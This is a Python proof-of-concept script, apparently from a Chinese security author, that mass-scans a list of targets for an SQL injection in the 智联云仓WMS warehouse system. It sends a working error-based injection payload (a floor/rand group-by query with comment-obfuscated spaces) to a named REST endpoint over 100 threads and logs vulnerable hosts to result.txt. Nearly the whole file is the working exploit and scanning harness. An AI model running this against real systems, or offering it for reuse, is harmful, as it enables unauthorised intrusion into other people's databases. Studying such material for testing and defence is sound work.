# poc 模板的写法
import argparse,sys,requests,json
import urllib3
import warnings
from multiprocessing.dummy import Pool # 多线程的库

# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def banner():
    test = """
░██       ░██ ░███     ░███   ░██████                 ░██████     ░██████   ░██         ░██
░██       ░██ ░████   ░████  ░██   ░██               ░██   ░██   ░██   ░██  ░██            
░██  ░██  ░██ ░██░██ ░██░██ ░██                     ░██         ░██     ░██ ░██         ░██
░██ ░████ ░██ ░██ ░████ ░██  ░████████               ░████████  ░██     ░██ ░██         ░██
░██░██ ░██░██ ░██  ░██  ░██         ░██                     ░██ ░██     ░██ ░██         ░██
░████   ░████ ░██       ░██  ░██   ░██               ░██   ░██   ░██   ░██  ░██         ░██
░███     ░███ ░██       ░██   ░██████   ░██████████   ░██████     ░██████   ░██████████ ░██
                                                                       ░██                 
                                                                        ░██                
                                                                      author:SIS2507
                                                                      version:1.0                     
"""
    print(test)
def main():
    banner()
    # sqlmap 都需要通过命令行传递参数
    # 单个url和一个文件
    # 初始化
    parse = argparse.ArgumentParser(description="智联云仓WMS 存在SQL注入")

    # 添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    parse.add_argument('-f','--file',dest='file',type=str,help='please input your file')

    # 实例化
    args = parse.parse_args()

    # 对用户输入的参数做判断 输入正确 url file 输入错误弹出提示
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        #多线程处理
        url_list = []#用于接收文件之后的url
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usage python {sys.argv[0]} -h")
def poc(target):
    link = "/dapilc/restful/service/ilcwmsplus/ISysPdaVersionService/getsyspdaversionlistbyparams"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.2029.104 Safari/537.36",
        "Content-Type": "application/json",
        "Content-Length": "183",
        "Connection": "close"
    }
    data = {"condition":{"field":"createDate,(select/**/5422/**/from(select/**/count(*),concat(0x7e,md5(1),0x7e,floor(rand(0)*2))x/**/from/**/information_schema.plugins/**/group/**/by/**/x)a)","order":"asc"},"current":1,"size":1}
    try:
        res1 = requests.get(url=target,headers=headers,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.post(url=target+link,headers=headers,json=data,verify=False,timeout=5)
            res2_content = json.loads(res2.text)
        
            if "c4ca4238a0b923820dcc509a6f75849b" in res2_content["errorMessage"]:
                print(f"[+]该{target}存在sql注入")
                    #把结果写入到一个文件
                with open('result.txt','a',encoding="utf-8") as f:
                    f.write(f"[+]该{target}存在sql注入,\n")
            else:
                print(f"[-]该{target}不存在sql注入")
    except:
        print(f"该{target}存在问题，请手工测试")  


  # 函数入口

if __name__ == "__main__":
    main()
